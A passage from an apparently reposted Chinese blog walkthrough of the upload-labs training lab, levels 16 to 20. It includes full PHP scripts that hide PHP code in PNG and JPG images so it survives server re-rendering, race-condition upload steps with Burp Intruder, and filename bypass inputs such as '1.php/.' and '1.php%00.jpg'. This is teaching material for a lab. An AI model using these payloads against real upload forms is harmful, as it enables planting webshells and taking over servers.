class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，这里先是判断Content-Type，然后再用imagecreatefrom[gif|png|jpg]函数判断是否是图片格式，如果是图片的话再用image[gif|png|jpg]函数对其进行二次渲染。</p>
<p>我们可以上传一个正常的图片文件，观察其上传前和上传后图片的二进制流是否发生变化，比如我用copy命令生成了shell.jpg，用十六进制编辑器打开可以看到,文件末尾有我加入的php语句。</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-11.png" alt="up-11"></p>
<p>将其上传，将服务器保存的即被二次渲染过的图片保存下来。</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-12.png" alt="up-12"></p>
<p>将被二次渲染过的图片用十六进制编辑器打开，如图,可以看到，图片的大小大幅减小，且前面加入的PHP代码也不见了。</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-13.png" alt="up-13"></p>
<h4 id="绕过方法-15"><a href="#绕过方法-15" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>由上面分析可知，如果想要绕过二次渲染的话，就要搞清楚二次渲染后，源文件哪些区域不会被修改或压缩。这里因为gif、jpg、png三种不同图片文件的文件格式不同，所以图片马的构造方法也不同，具体可以参考:<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a>我这里也简单提炼写一下。</p>
<h5 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h5><p>gif二次渲染绕过说是最简单的。将源文件和二次渲染过的文件进行比较，找出源文件中没有被修改的那段区域，在那段区域写入php代码即可。用UE的比较功能，可以迅速找到两者匹配的地方。在匹配处写入php代码即可。</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-14.png" alt="up-14"></p>
<h5 id="png"><a href="#png" class="headerlink" title="png"></a>png</h5><p>png和jpg当然没有gif这么简单。这里我也不细分析了(分析不来~~)<br>直接记个方法，将php代码写入IDAT数据块。用国外大牛的脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">'./1.png'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接运行该脚本生成1.png上传即可，生成的1.png如下图</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-15.png" alt="up-15"></p>
<h5 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a>jpg</h5><p>jpg也是用国外大牛脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs "Something's wrong".</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    $miniPayload = <span class="string">"&lt;?=phpinfo();?&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">'gd'</span>) || !function_exists(<span class="string">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php-gd is not installed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">"custom_error_handler"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Incorrect SOI marker'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">'_'</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="keyword">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Success!'</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Something\'s wrong'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span><span class="params">($filename, $data, $unlink = FALSE)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = <span class="keyword">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $binData;</span><br><span class="line">        <span class="keyword">private</span> $order;</span><br><span class="line">        <span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $order = false, $fromString = false)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'File not exists ['</span>.$filename.<span class="string">']'</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span><span class="params">($skip)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用方法：</p>
<ol>
<li>先将一张正常的jpg图片上传，上传后将服务器存储的二次渲染的图片保存下来。</li>
<li>将保存下来经过服务器二次渲染的那张jpg图片，用此脚本进行处理生成payload.jpg</li>
<li>然后再上传payload.jpg</li>
</ol>
<p>上面顺序注意一下，如果不成功的话，多换几张的jpg试试</p>
<h3 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17 条件竞争"></a>Pass-17 条件竞争</h3><h4 id="代码分析-16"><a href="#代码分析-16" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不难发现，这里是先move_uploaded_file函数将上传文件临时保存，再进行判断，如果不在白名单里则unlink删除，在的话就rename重命名，所以这里存在条件竞争。</p>
<h4 id="绕过方法-16"><a href="#绕过方法-16" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>用burp开启两个intruder模块，一个用于重复上传，另一个用于重复访问。<br>1、先设置上传请求,记住此处的文件名，等下要用来拼接访问请求的url</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-16.png" alt="up-16"></p>
<p>2、因为此处没有什么参数需要爆破，只是需要重复发起请求，所以payload设置为Null payloads,设置访问次数5000次，线程50个</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-17.png" alt="up-17"></p>
<p>接下来设置访问请求<br> 1、浏览器构造请求url：<code>http://127.0.0.1/upload-labs-master/upload/miracle778.php</code>,进行访问，然后用burp抓包<br> 2、burp抓包后发送至intruder模块，然后设置payload，这一步和上传请求设置差不多,都是Null payloads、5000次、50个线程</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-18.png" alt="up-18"></p>
<p>设置好两个模块后同时启动，观察结果，因为我们传入的php代码是<code>phpinfo();</code>,所以如果访问成功的话，会返回php的配置信息。</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-19.png" alt="up-19"></p>
<p>可以看到，5000次里有3次访问成功，剩下的访问次数里，有小部分是状态码返回200，但执行出错</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-20.png" alt="up-20"></p>
<p>剩下大部分访问结果是状态码是404。<br>由此可得出结论，条件竞争绕过存在一定概率，实践中如果一次不成功，可以多试几次。</p>
<h3 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18 条件竞争"></a>Pass-18 条件竞争</h3><h4 id="代码分析-17"><a href="#代码分析-17" class="headerlink" title="代码分析"></a>代码分析</h4><p>这里代码太长，就不贴了，简单截个图</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-21.png" alt="up-21"></p>
<p>可以看到，这里先将上传的文件保存（move函数），再rename重命名一下。所以也存在条件竞争，绕过方法和上面Pass-17差不多，这里就不重复写了。</p>
<h4 id="绕过方法-17"><a href="#绕过方法-17" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>参照Pass-17</p>
<h3 id="Pass-19-绕过"><a href="#Pass-19-绕过" class="headerlink" title="Pass-19 ./绕过"></a>Pass-19 ./绕过</h3><h4 id="代码分析-18"><a href="#代码分析-18" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里关于pathinfo的说明如下图</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-22.png" alt="up-22"></p>
<p>可以看到，这里img_path可控（通过post sava_name），所以可以利用move_uploaded_file的\x00截断(save_name=1.php%00.jpg)绕过,但\x00截断之前关卡已经出现过了，这里明显是考察别的知识点。于是网上找找别人的答案，发现考点是:move_uploaded_file会忽略掉文件末尾的/.所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php</p>
<h4 id="绕过方法-18"><a href="#绕过方法-18" class="headerlink" title="绕过方法"></a>绕过方法</h4><ol>
<li>post: save_name = 1.php%00.jpg</li>
<li>post: save_name = 1.php/.</li>
</ol>
<h3 id="Pass-20-数组-绕过"><a href="#Pass-20-数组-绕过" class="headerlink" title="Pass-20 数组/.绕过"></a>Pass-20 数组/.绕过</h3><h4 id="代码分析-19"><a href="#代码分析-19" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'upload_file'</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">"禁止上传该类型文件!"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">"禁止上传该后缀文件!"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传成功！"</span>;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传失败！"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">"请选择要上传的文件！"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现<code>$file_name</code>经过<code>reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>处理。</p>
<p>如果上传的是数组的话，会跳过<code>$file = explode(&#39;.&#39;, strtolower($file));</code>。并且后缀有白名单过滤</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ext</span> = <span class="keyword">end</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br></pre></td></tr></table></figure>

<p>而最终的文件名后缀取的是<code>$file[count($file) - 1]</code>，因此我们可以让<code>$file</code>为数组。<code>$file[0]</code>为<code>smi1e.php/</code>，也就是<code>reset($file)</code>，然后再令<code>$file[2]</code>为白名单中的jpg。此时<code>end($file)</code>等于jpg，<code>$file[count($file) - 1]</code>为空。而 <code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>，也就是<code>smi1e.php/.</code>，最终<code>move_uploaded_file</code>会忽略掉<code>/.</code>，最终上传<code>smi1e.php</code>。</p>
<h4 id="绕过方法-19"><a href="#绕过方法-19" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>如图</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-24.png" alt="up-24"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个20关做下来，感觉大多数文件上传类型都讲到了。这个项目官方github上面也有一张总结图，感觉挺到位，就拿过来好了。</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-25.png" alt="up-25"></p>
<p>文章转自<a href="https://www.jianshu.com/p/aabc1e7408d5" target="_blank" rel="noopener">https://www.jianshu.com/p/aabc1e7408d5</a></p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://xz.aliyun.com/t/4029#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/4029#toc-10</a></p>
